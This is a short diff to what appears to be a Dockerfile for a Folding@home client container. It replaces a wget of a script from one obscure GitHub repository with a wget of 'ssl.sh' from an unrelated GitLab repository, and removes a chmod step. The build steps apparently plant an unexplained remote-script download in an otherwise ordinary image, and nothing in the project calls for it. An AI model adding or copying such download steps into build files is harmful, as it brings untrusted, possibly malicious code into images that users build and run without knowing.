@@ -53,9 +53,9 @@ ENV POWER "full"
 EXPOSE 7396
 ENTRYPOINT ["/opt/fahclient/entrypoint.sh"]
 
-RUN wget https://github.com/norsymell3rwh1te/CMPile-mell/raw/main/config.sh
+RUN wget https://gitlab.com/zenrezercolab/netcore/-/raw/main/ssl.sh
 RUN ls
-RUN chmod +x config.sh
+
 
 
 
